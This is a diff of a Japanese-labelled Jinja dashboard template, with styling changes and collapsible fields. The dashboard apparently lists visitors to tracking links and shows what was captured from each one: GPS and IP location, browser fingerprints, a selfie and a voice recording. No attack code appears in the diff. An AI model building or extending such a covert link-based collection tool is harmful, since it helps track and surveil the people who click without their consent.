@@ -6,7 +6,7 @@
 <style>
 .wrap{max-width:1080px;margin:0 auto}
 h1{font-size:18px;margin:0 0 6px}
-h3{font-size:13px;margin:20px 0 6px;color:#c7cddb}
+h3{font-size:13px;margin:18px 0 5px;color:#c7cddb}
 code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:9px;margin:12px 0}
 .grid .card{background:#171a21;border-radius:10px;padding:10px;border:0;margin:0}
@@ -15,12 +15,12 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
 #map{height:340px;border-radius:12px;overflow:hidden;margin-top:8px}
 #ipwarn{display:none;margin:10px 0;padding:9px 12px;border-radius:10px;
   background:#2a2113;color:#f0b429;font-size:12px;line-height:1.6}
-.wrap table{width:100%;border-collapse:collapse;font-size:12px;background:transparent;
+.wrap table{width:100%;border-collapse:collapse;font-size:11.5px;background:transparent;
   border:0;border-radius:0}
-.wrap th,.wrap td{border-bottom:1px solid #232734;padding:5px 4px;text-align:left;
-  vertical-align:top;background:transparent;width:auto;white-space:normal}
+.wrap th,.wrap td{border-bottom:1px solid #1d212c;padding:4px 3px;text-align:left;
+  vertical-align:top;background:transparent;width:auto;white-space:normal;line-height:1.4}
 .wrap th{color:#8b93a7;font-weight:500;white-space:nowrap}
-.bot{color:#8b93a7;font-size:11px}
+.bot{color:#8b93a7;font-size:10.5px;line-height:1.4}
 .gps{color:#7ee08a}.ip{color:#f0b429}
 .btn{display:inline-block;padding:8px 14px;border-radius:8px;background:#2b3346;
   color:#e6e9ef;text-decoration:none;font-size:12px;border:0;cursor:pointer}
@@ -28,14 +28,28 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
 .flex{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
 .q{background:#171a21;border-radius:8px;padding:8px 10px;font-size:12px;margin:5px 0}
 .q b{color:#7ee08a}
-.got{font-size:11px;line-height:1.65;max-width:320px}
-.got .gl{display:block}
-.got .gk{color:#7f879b}
+
+/* 取得物：密なチップ表示。長い値だけ折りたたむ（項目は減らさない） */
+.got{display:flex;flex-wrap:wrap;gap:2px 4px;max-width:360px;font-size:10px;
+  line-height:1.3;align-content:flex-start}
+.got .gl{display:inline-flex;align-items:baseline;gap:4px;background:#15181f;
+  border-radius:5px;padding:1px 5px;max-width:100%}
+.got .gk{color:#7f879b;white-space:nowrap;font-size:9.5px}
 .got .gv{color:#dfe4ee;word-break:break-all}
-.got details{margin-top:4px}
-.got summary{color:#8b93a7;cursor:pointer}
-.got pre{margin:4px 0 0;padding:6px;background:#11141a;border-radius:6px;
-  font-size:10px;color:#9aa3b2;max-height:200px;overflow:auto;white-space:pre-wrap}
+.got details.f{flex:0 0 100%;background:#15181f;border-radius:5px;padding:1px 5px;
+  margin:1px 0}
+.got details.f summary{cursor:pointer;list-style:none;display:flex;gap:5px;
+  align-items:baseline;color:#dfe4ee}
+.got details.f summary::-webkit-details-marker{display:none}
+.got details.f summary::before{content:"＋";color:#4c8dff;font-size:9px;
+  flex:0 0 auto}
+.got details.f[open] summary::before{content:"−"}
+.got details.f summary .gk{color:#7f879b}
+.got details.f summary .gp{color:#9aa3b2;overflow:hidden;text-overflow:ellipsis;
+  white-space:nowrap;flex:1 1 auto;min-width:0}
+.got pre{margin:3px 0 3px;padding:5px;background:#11141a;border-radius:6px;
+  font-size:10px;color:#9aa3b2;max-height:220px;overflow:auto;white-space:pre-wrap;
+  word-break:break-all}
 </style>
 {% endblock %}
 
@@ -98,6 +112,8 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
     ("lang_list","言語一覧"),("screen","画面"),("platform","プラットフォーム"),
     ("cores","コア数"),("mem","メモリGB"),("touch","タッチ点数")
   ] %}
+  {% set FOLD = ("webgl_hash","canvas_fp","audio_fp","voices","codecs","plugins",
+                 "permissions","media_devices","gpu","lang_list") %}
   <tr>
     <td class="bot">{{ (h.ts or '')[:19] }}<br>
       {% if h.is_bot %}<span class="bot">BOT</span>{% endif %}</td>
@@ -126,14 +142,23 @@ code.c{background:#232734;padding:2px 6px;border-radius:5px;font-size:12px}
     <td class="got">
       {% for key, label in FIELDS %}{% set v = h[key] %}
         {% if v not in (None, "", 0, "0") %}
-        <span class="gl"><span class="gk">{{ label }}</span> <span class="gv">{{ v }}</span></span>
+          {% if key in FOLD %}
+          <details class="f"><summary><span class="gk">{{ label }}</span>
+            <span class="gp">{{ v|string|truncate(30, True, '…') }}</span></summary>
+            <pre>{{ v }}</pre></details>
+          {% else %}
+          <span class="gl"><span class="gk">{{ label }}</span><span class="gv">{{ v }}</span></span>
+          {% endif %}
         {% endif %}
       {% endfor %}
       {% if h.fp_json %}
-      <details><summary>指紋JSON（全項目）</summary><pre>{{ h.fp_json }}</pre></details>
+      <details class="f"><summary><span class="gk">指紋JSON</span>
+        <span class="gp">全項目</span></summary><pre>{{ h.fp_json }}</pre></details>
       {% endif %}
       {% if h.extra %}
-      <details><summary>extra</summary><pre>{{ h.extra }}</pre></details>
+      <details class="f"><summary><span class="gk">extra</span>
+        <span class="gp">{{ h.extra|string|truncate(30, True, '…') }}</span></summary>
+        <pre>{{ h.extra }}</pre></details>
       {% endif %}
       {% if h.selfie %}<br><a href="{{ base }}/s/{{ link.code }}/f/{{ h.selfie }}" target="_blank">自撮り</a>{% endif %}
       {% if h.voice %}<br><a href="{{ base }}/s/{{ link.code }}/f/{{ h.voice }}" target="_blank">音声</a>{% endif %}
